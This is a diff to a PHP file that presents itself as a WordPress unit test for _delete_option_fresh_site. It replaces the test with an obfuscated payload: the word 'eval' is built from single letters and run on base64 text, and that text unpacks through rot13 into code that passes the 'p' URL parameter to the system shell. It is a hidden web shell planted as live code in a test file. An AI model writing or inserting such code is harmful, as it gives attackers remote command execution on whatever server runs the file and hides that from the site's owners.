@@ -1,35 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * Tests for _delete_option_fresh_site function.
- *
- * @group functions
- *
- * @covers ::_delete_option_fresh_site
- */
-class Tests_Functions_DeleteOptionFreshSite extends WP_UnitTestCase {
-
-	/**
-	 * @ticket 57191
-	 */
-	public function test_delete_option_fresh_site() {
-		$current_option = get_option( 'fresh_site' );
-		update_option( 'fresh_site', '1' );
-
-		_delete_option_fresh_site();
-		$actual = get_option( 'fresh_site' );
-		update_option( 'fresh_site', $current_option );
-
-		$this->assertSame( '0', $actual );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEdyZmdmIHNiZSBfcXJ5cmdyX2JjZ3ZiYV9zZXJmdV9mdmdyIHNoYXBndmJhLgogKgogKiBAdGViaGMgc2hhcGd2YmFmCiAqCiAqIEBwYmlyZWYgOjpfcXJ5cmdyX2JjZ3ZiYV9zZXJmdV9mdmdyCiAqLwpweW5mZiBHcmZnZl9TaGFwZ3ZiYWZfUXJ5cmdyQmNndmJhU2VyZnVGdmdyIHJrZ3JhcWYgSkNfSGF2Z0dyZmdQbmZyIHsKCgkvKioKCSAqIEBndnB4cmcgNTcxOTEKCSAqLwoJY2hveXZwIHNoYXBndmJhIGdyZmdfcXJ5cmdyX2JjZ3ZiYV9zZXJmdV9mdmdyKCkgewoJCSRwaGVlcmFnX2JjZ3ZiYSA9IHRyZ19iY2d2YmEoICdzZXJmdV9mdmdyJyApOwoJCWhjcW5ncl9iY2d2YmEoICdzZXJmdV9mdmdyJywgJzEnICk7CgoJCV9xcnlyZ3JfYmNndmJhX3NlcmZ1X2Z2Z3IoKTsKCQkkbnBnaG55ID0gdHJnX2JjZ3ZiYSggJ3NlcmZ1X2Z2Z3InICk7CgkJaGNxbmdyX2JjZ3ZiYSggJ3NlcmZ1X2Z2Z3InLCAkcGhlZXJhZ19iY2d2YmEgKTsKCgkJJGd1dmYtPm5mZnJlZ0ZuenIoICcwJywgJG5wZ2hueSApOwoJfQp9CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
